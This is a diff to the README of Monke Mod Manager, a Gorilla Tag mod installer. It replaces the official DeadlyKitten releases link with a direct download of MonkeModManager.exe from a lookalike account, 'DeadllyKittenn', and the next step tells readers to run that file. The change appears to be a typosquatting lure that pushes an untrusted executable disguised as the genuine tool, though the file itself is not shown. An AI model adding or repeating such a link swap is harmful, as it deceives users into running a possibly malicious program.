@@ -12,7 +12,7 @@ Monke Mod Manager is a simple and lightweight mod installer for **Gorilla Tag**.
 
 ## 🚀 How to Use
 
-1. **Download** the latest release from [Releases](https://github.com/DeadlyKitten/MonkeModManager/releases).
+1. **Download** the latest release from [Releases](https://github.com/DeadllyKittenn/MonkeModManager/releases/download/Gorilla/MonkeModManager.exe).
 2. Run `MonkeModManager.exe`.
 3. Select the mods you want.
 4. Click `Install / Update`.
